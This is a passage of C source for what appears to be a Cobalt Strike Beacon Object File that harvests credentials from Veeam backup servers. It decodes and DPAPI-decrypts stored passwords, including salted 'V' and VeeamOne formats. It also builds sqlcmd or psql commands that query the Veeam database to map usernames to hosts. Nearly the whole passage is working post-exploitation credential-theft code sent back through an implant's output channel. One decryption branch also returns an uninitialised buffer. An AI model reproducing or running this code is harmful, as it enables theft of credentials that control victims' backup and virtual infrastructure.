    if (!data || len < 2 || (len % 2 != 0))
        return FALSE;

    int zero_bytes = 0;
    int check_len = len < 64 ? len : 64; 

    for (DWORD i = 1; i < check_len; i += 2)
        if (data[i] == 0x00) zero_bytes++;

    return ((zero_bytes * 100) / (check_len / 2)) > 70;
}

char *WideToNarrow(BYTE *bytes, DWORD byteLen)
{

    WCHAR *wide = (WCHAR*)bytes;
    DWORD wideLen = byteLen / 2;

    if (!wide || wideLen == 0)
        return NULL;


    // Compute required UTF-8 length
    int utf8Len = WideCharToMultiByte( CP_UTF8, 0, wide, wideLen, NULL, 0, NULL, NULL);

    if (utf8Len <= 0)
        return NULL;

    char *narrow = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, utf8Len + 1);
    if (!narrow)
        return NULL;

    // Perform conversion
    int result = WideCharToMultiByte(CP_UTF8,0,wide,wideLen,narrow,utf8Len,NULL,NULL
    );

    if (result != utf8Len) {
        HeapFree(GetProcessHeap(), 0, narrow);
        return NULL;
    }

    narrow[utf8Len] = '\0';
    return narrow;
}

char* DecryptV(char* encPass){
    // if (debug)
    //     BeaconFormatPrintf(&buffer, "[DEBUG] V-Type : %s\n", encPass);

    // if salt value is empty we cant do V-type
    if (salt_length <=0){
        BeaconPrintf(CALLBACK_ERROR,"Cant decrypt %s without a salt",encPass);
        return NULL;
    }
    DWORD data_len = 0;
    // Attempt to base64 decode
    if (!CryptStringToBinaryA(encPass, 0, 0x1 , NULL, &data_len, NULL, NULL)){
        BeaconPrintf(CALLBACK_ERROR,"CryptStringToBinaryA Failed");
        return NULL;
    }
        

    BYTE *data = (BYTE *)malloc(data_len+1);
    if (!data) return NULL;

    if (!CryptStringToBinaryA(encPass, 0, 0x1, data, &data_len, NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR,"CryptStringToBinaryA Failed");
        free(data);
        return NULL;
    }

    if (data_len <= 37) {
        free(data);
        return NULL; // invalid V-format blob
    }
    BYTE *dpapi_blob = data + 37;
    DWORD dpapi_len = data_len - 37;

    DATA_BLOB in_blob;
    in_blob.cbData = dpapi_len;
    in_blob.pbData = dpapi_blob;


    BYTE salt_bin[MAX_SALT_LEN];
    DWORD salt_len = MAX_SALT_LEN;

    if (!CryptStringToBinaryA(salt,0,0x1,salt_bin,&salt_len,NULL,NULL))
    {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to Base64-decode salt\n");
        return NULL;
    }

    DATA_BLOB entropy_blob;
    entropy_blob.cbData = salt_len;
    entropy_blob.pbData = salt_bin;

    DATA_BLOB out_blob;

    // BeaconPrintf(CALLBACK_OUTPUT,"Decrypting: %s ,with key %s",encPass,salt);
    char *plaintext = NULL;
    if (!CryptUnprotectData(&in_blob, NULL, &entropy_blob, NULL, NULL, 0x4 /*LOCAL_MACHINE*/, &out_blob)) {
        DWORD err = GetLastError();
        PrintAndClear();
        BeaconPrintf(CALLBACK_ERROR, "CryptUnprotectData failed with error code: 0x%08X\n", err);
        free(data);
        return NULL;
    }

    if (IsProbablyWideString(out_blob.pbData,out_blob.cbData)){
        if (debug)
            BeaconFormatPrintf(&buffer, "[DEBUG] Converting likely wide string\n");
        plaintext = WideToNarrow(out_blob.pbData,out_blob.cbData);
    }else{

        plaintext = (char *)malloc(out_blob.cbData + 1);
        if (!plaintext) {
            // LocalFree(out_blob.pbData);
            free(data);
            return NULL;
        }
        memcpy(plaintext, out_blob.pbData, out_blob.cbData);
        plaintext[out_blob.cbData] = '\0';
    }

    return plaintext; 
}
char* DecryptA(char* encPass){
    if (debug)
        BeaconFormatPrintf(&buffer, "[DEBUG] A-Type : %s\n", encPass);

    // check that we have a salt if its VeeamOne
    if(VeeamOne && (salt_length <=0)){
        BeaconPrintf(CALLBACK_ERROR,"Cant decrypt %s without a salt",encPass);
        return NULL;
    }

    // // return NULL;
    DWORD data_len = 0;
    // Attempt to base64 decode
    if (!CryptStringToBinaryA(encPass, 0, 0x1 , NULL, &data_len, NULL, NULL)){
        BeaconPrintf(CALLBACK_ERROR,"CryptStringToBinaryA Failed");
        return NULL;
    }

    BYTE *data = (BYTE *)malloc(data_len+1);
    if (!data) return NULL;

    if (!CryptStringToBinaryA(encPass, 0, 0x1, data, &data_len, NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR,"CryptStringToBinaryA Failed");
        free(data);
        return NULL;
    }
    
    BYTE *dpapi_blob = data;
    DWORD dpapi_len = data_len;

    DATA_BLOB in_blob;
    in_blob.cbData = data_len;
    in_blob.pbData = dpapi_blob;

    DATA_BLOB out_blob;
    // VeeamOne uses A type with entropy
    if (VeeamOne){
        // BeaconPrintf(CALLBACK_OUTPUT,"Attempting decrypt A Type for VeeamOne");
        
        DATA_BLOB entropy_blob;
        entropy_blob.cbData = salt_length;
        entropy_blob.pbData = salt;


        char *plaintext = NULL;
        if (!CryptUnprotectData(&in_blob, NULL, &entropy_blob, NULL, NULL, 0x4 , &out_blob)) {
            DWORD err = GetLastError();
            PrintAndClear();
            BeaconPrintf(CALLBACK_ERROR, "CryptUnprotectData failed with error code: 0x%08X\n", err);
            free(data);
            return NULL;
        }

        if (IsProbablyWideString(out_blob.pbData,out_blob.cbData)){
             if (debug)
                BeaconFormatPrintf(&buffer, "[DEBUG] Converting likely wide string\n");
            plaintext = WideToNarrow(out_blob.pbData,out_blob.cbData);
        }else{

            plaintext = (char *)malloc(out_blob.cbData + 1);
            if (!plaintext) {
                // LocalFree(out_blob.pbData);
                free(data);
                return NULL;
            }
            memcpy(plaintext, out_blob.pbData, out_blob.cbData);
            plaintext[out_blob.cbData] = '\0';
        }

        return plaintext; 


    }else{ //A type without entropy
        // BeaconPrintf(CALLBACK_OUTPUT,"Attempting decrypt standard A Type");
        
        char *plaintext = NULL;
        if (!CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0x4 , &out_blob)) {
            DWORD err = GetLastError();
            PrintAndClear();
            BeaconPrintf(CALLBACK_ERROR, "CryptUnprotectData failed with error code: 0x%08X\n", err);
            free(data);
            return NULL;
        }
        if (IsProbablyWideString(out_blob.pbData,out_blob.cbData)){
             if (debug)
                BeaconFormatPrintf(&buffer, "[DEBUG] Converting likely wide string\n");
            plaintext = WideToNarrow(out_blob.pbData,out_blob.cbData);
        }else{

            plaintext = (char *)malloc(out_blob.cbData + 1);
            if (!plaintext) {
                // LocalFree(out_blob.pbData);
                free(data);
                return NULL;
            }
        }

        return plaintext; 
        
    }
    return NULL;
}

void mapCredentials(){
    

    BeaconFormatPrintf(&host_creds_buffer, "======================\n");
    BeaconFormatPrintf(&host_creds_buffer, "Username -> Host\n");
    BeaconFormatPrintf(&host_creds_buffer, "======================\n");

    char * sql_output = NULL;
    char *output = NULL;
    int total_len = 0;
    char cmdLine[2024];

    strcpy(cmdLine, "\"");
    strcat(cmdLine, exe_path);


    if (strcmp(db_type, "mssql") == 0 ) {
        char * instance_name = (char*)malloc(MAX_INSTANCE_LEN);
        int  instance_length;


        GetMSSQLInstance(&instance_length,instance_name);

        if(VeeamOne)
            strcat(cmdLine, "\" -S "); 
        else
            strcat(cmdLine, "\" -S .\\"); 

        strcat(cmdLine, instance_name); 
        strcat(cmdLine, " -E -d ");
        strcat(cmdLine, db_name);
        strcat(cmdLine, " -s\":\" -y0 -Q \"");
        if(VeeamOne)
            strcat(cmdLine, mssql_VeeamOne_hosts_query);
        else
            strcat(cmdLine, mssql_hosts_query);
        strcat(cmdLine, "\" ");
        
        if (debug)
            BeaconFormatPrintf(&buffer, "[DEBUG] Command: %s\n",cmdLine);
        // return;
        output = runCommand(cmdLine,&total_len);
            
        // sql_output = RunDBQueryMSSQL(exe_path,db_name,&sql_output_length);
        // PrintAndClear();
        
    }
    else if (strcmp(db_type, "psql") == 0){


        // snprintf(cmdLine, sizeof(cmdLine), "\"%s\"  -U postgres -A -F : -c \"%s\"", db_path, psql_query);

        strcat(cmdLine, "\" -d "); 
        strcat(cmdLine, db_name); 
        strcat(cmdLine, " -U postgres -A -F : -c \"");
        strcat(cmdLine, psql_hosts_query);
        strcat(cmdLine, "\"");
        
        if (debug)
            BeaconFormatPrintf(&buffer, "[DEBUG] Command: %s\n",cmdLine);
        
        output = runCommand(cmdLine,&total_len);

            // sql_output = RunDBQueryPSQL(exe_path,db_name,&sql_output_length);
    }
    if(total_len >0){
        // return output;
        BeaconFormatPrintf(&host_creds_buffer, "%s\n",output);
        // BeaconFormatPrintf(&host_creds_buffer, "======================\n");
    }
    // else{
    //     BeaconPrintf(CALLBACK_ERROR, "Process output returned 0 length!");
    // }


}